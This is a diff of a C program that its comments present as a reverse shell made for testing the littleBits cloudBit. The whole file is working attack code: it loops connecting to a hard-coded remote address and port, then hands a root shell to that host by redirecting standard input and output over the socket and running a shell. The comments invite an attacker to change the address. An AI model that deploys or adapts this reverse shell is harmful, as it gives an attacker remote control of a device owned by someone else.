@@ -1,3 +1,9 @@
+// Developed by Cervando Banuelos
+// To test the network capabilities of the littleBits cloudBit
+// This program can be used to give a shell to a remote machine
+// and give the user root access.
+
+
 #include <stdio.h> 
 #include <stdlib.h>
 #include <unistd.h>
@@ -7,9 +13,10 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 
+// arbitrary IP address and port number
+// these were used during exploit development and can be changed
+// to suit the needs of attacker
 #define REMOTE_ADDR "10.0.0.104"
-
-//#define REMOTE_ADDR "127.0.0.1"
 #define REMOTE_PORT 9001
 
 int main(int argc, char *argv[])
@@ -32,7 +39,7 @@ int main(int argc, char *argv[])
 		//attempt to connect
 		if ((connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0)) //connection fails
 		{
-			//printf("Connect fail\n");
+			// if connection failed, close socket and try again with new socket
 			close(s);
 			continue;
 		}
@@ -42,9 +49,9 @@ int main(int argc, char *argv[])
 
 		else //connecitons succeeds
 		{
-			//connect(s, (struct sockaddr *)&sa, sizeof(sa));
 			if ((pid = fork()) == 0) //Child Process
 			{
+				// dup2 and execve a shell over the port
 				dup2(s,0);
 				dup2(s,1);
 				dup2(s,2);
@@ -56,21 +63,13 @@ int main(int argc, char *argv[])
 
 			else //Parent Process
 			{                               
-
+			// parent process continues to try to connect even if child is closed.
 			waitpid(-1, NULL, WNOHANG);
 			close(s);
 			continue;
 	     	}
-
-		//waitpid(-1, NULL, WNOHANG);
 	}
-
-
-
-
-//return 0;
 }
-
 
 return 0;
 }
